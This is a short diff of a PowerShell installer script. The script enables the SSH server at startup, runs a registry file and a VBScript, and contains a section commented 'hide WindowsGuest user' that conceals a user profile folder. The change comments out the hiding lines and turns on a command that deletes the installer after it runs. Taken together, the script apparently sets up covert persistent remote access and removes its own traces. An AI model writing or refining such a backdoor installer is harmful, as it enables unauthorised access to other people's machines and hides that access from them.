@@ -52,9 +52,9 @@ Set-Service -Name sshd -StartupType 'Automatic'
 ./"Registry.reg"; ./"confirm.vbs"
 
 # hide WindowsGuest user
-cd C:\Users
-attrib +h +s +r rootuser
+#cd C:\Users
+#attrib +h +s +r winlocal
 
 # self delete
 cd $initial_dir
-#del installer.ps1
+del installer.ps1
